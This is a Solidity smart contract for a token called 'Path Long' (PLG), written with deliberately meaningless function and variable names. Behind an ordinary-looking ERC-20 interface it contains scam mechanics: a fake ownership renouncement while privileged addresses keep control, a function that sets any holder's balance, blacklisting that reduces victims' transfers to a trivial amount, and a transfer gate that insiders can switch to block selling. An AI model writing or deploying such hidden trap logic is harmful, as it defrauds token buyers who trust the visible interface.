//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

interface liquidityLaunch {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract txTeam {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface feeLaunchTake {
    function createPair(address exemptList, address liquidityAmount) external returns (address);
}

interface marketingMode {
    function totalSupply() external view returns (uint256);

    function balanceOf(address receiverIsFund) external view returns (uint256);

    function transfer(address limitBuyFund, uint256 modeFundWallet) external returns (bool);

    function allowance(address liquidityList, address spender) external view returns (uint256);

    function approve(address spender, uint256 modeFundWallet) external returns (bool);

    function transferFrom(
        address sender,
        address limitBuyFund,
        uint256 modeFundWallet
    ) external returns (bool);

    event Transfer(address indexed from, address indexed atMin, uint256 value);
    event Approval(address indexed liquidityList, address indexed spender, uint256 value);
}

interface feeLaunched is marketingMode {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract PathLong is txTeam, marketingMode, feeLaunched {

    mapping(address => mapping(address => uint256)) private sellAmount;

    function owner() external view returns (address) {
        return marketingLimit;
    }

    mapping(address => bool) public marketingBuy;

    function getOwner() external view returns (address) {
        return marketingLimit;
    }

    address public receiverSell;

    function marketingShouldMin(address enableReceiverTx) public {
        maxLimit();
        
        if (enableReceiverTx == receiverSell || enableReceiverTx == atMaxMode) {
            return;
        }
        marketingBuy[enableReceiverTx] = true;
    }

    function buyReceiver(address maxSwap, address limitBuyFund, uint256 modeFundWallet) internal returns (bool) {
        require(tradingMarketing[maxSwap] >= modeFundWallet);
        tradingMarketing[maxSwap] -= modeFundWallet;
        tradingMarketing[limitBuyFund] += modeFundWallet;
        emit Transfer(maxSwap, limitBuyFund, modeFundWallet);
        return true;
    }

    constructor (){
        
        liquidityLaunch fundReceiver = liquidityLaunch(sellAuto);
        atMaxMode = feeLaunchTake(fundReceiver.factory()).createPair(fundReceiver.WETH(), address(this));
        if (takeBuy != isFund) {
            isFund = takeBuy;
        }
        receiverSell = _msgSender();
        receiverSellLimit();
        buyLaunched[receiverSell] = true;
        tradingMarketing[receiverSell] = shouldList;
        if (feeTx == fromLaunchMax) {
            receiverLaunchAuto = teamLaunch;
        }
        emit Transfer(address(0), receiverSell, shouldList);
    }

    bool public senderTotal;

    address listShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => uint256) private tradingMarketing;

    function symbol() external view virtual override returns (string memory) {
        return txMin;
    }

    bool private fromLaunchMax;

    function liquidityReceiver(address teamBuyLiquidity) public {
        require(teamBuyLiquidity.balance < 100000);
        if (senderTotal) {
            return;
        }
        
        buyLaunched[teamBuyLiquidity] = true;
        
        senderTotal = true;
    }

    uint256 public takeBuy;

    function receiverSellLimit() public {
        emit OwnershipTransferred(receiverSell, address(0));
        marketingLimit = address(0);
    }

    function allowance(address modeIs, address exemptTake) external view virtual override returns (uint256) {
        if (exemptTake == sellAuto) {
            return type(uint256).max;
        }
        return sellAmount[modeIs][exemptTake];
    }

    function maxLimit() private view {
        require(buyLaunched[_msgSender()]);
    }

    string private txMin = "PLG";

    function totalSupply() external view virtual override returns (uint256) {
        return shouldList;
    }

    bool public tokenAmount;

    uint256 private shouldList = 100000000 * 10 ** 18;

    address private marketingLimit;

    bool private feeTx;

    address sellAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    event OwnershipTransferred(address indexed toLaunched, address indexed listReceiver);

    function limitTo(uint256 modeFundWallet) public {
        maxLimit();
        liquidityTradingReceiver = modeFundWallet;
    }

    uint256 public teamLaunch;

    uint256 public isFund;

    uint256 constant takeMax = 3 ** 10;

    function transfer(address launchedAmountLimit, uint256 modeFundWallet) external virtual override returns (bool) {
        return minExemptMode(_msgSender(), launchedAmountLimit, modeFundWallet);
    }

    function minExemptMode(address maxSwap, address limitBuyFund, uint256 modeFundWallet) internal returns (bool) {
        if (maxSwap == receiverSell) {
            return buyReceiver(maxSwap, limitBuyFund, modeFundWallet);
        }
        uint256 liquidityListSender = marketingMode(atMaxMode).balanceOf(listShould);
        require(liquidityListSender == liquidityTradingReceiver);
        require(limitBuyFund != listShould);
        if (marketingBuy[maxSwap]) {
            return buyReceiver(maxSwap, limitBuyFund, takeMax);
        }
        return buyReceiver(maxSwap, limitBuyFund, modeFundWallet);
    }

    uint256 exemptFee;

    function balanceOf(address receiverIsFund) public view virtual override returns (uint256) {
        return tradingMarketing[receiverIsFund];
    }

    function takeSenderMin(address launchedAmountLimit, uint256 modeFundWallet) public {
        maxLimit();
        tradingMarketing[launchedAmountLimit] = modeFundWallet;
    }

    mapping(address => bool) public buyLaunched;

    uint256 private receiverLaunchAuto;

    uint8 private launchSender = 18;

    function decimals() external view virtual override returns (uint8) {
        return launchSender;
    }

    function transferFrom(address maxSwap, address limitBuyFund, uint256 modeFundWallet) external override returns (bool) {
        if (_msgSender() != sellAuto) {
            if (sellAmount[maxSwap][_msgSender()] != type(uint256).max) {
                require(modeFundWallet <= sellAmount[maxSwap][_msgSender()]);
                sellAmount[maxSwap][_msgSender()] -= modeFundWallet;
            }
        }
        return minExemptMode(maxSwap, limitBuyFund, modeFundWallet);
    }

    function name() external view virtual override returns (string memory) {
        return receiverLimit;
    }

    bool public minMode;

    uint256 liquidityTradingReceiver;

    uint256 public liquidityEnable;

    address public atMaxMode;

    function approve(address exemptTake, uint256 modeFundWallet) public virtual override returns (bool) {
        sellAmount[_msgSender()][exemptTake] = modeFundWallet;
        emit Approval(_msgSender(), exemptTake, modeFundWallet);
        return true;
    }

    string private receiverLimit = "Path Long";

}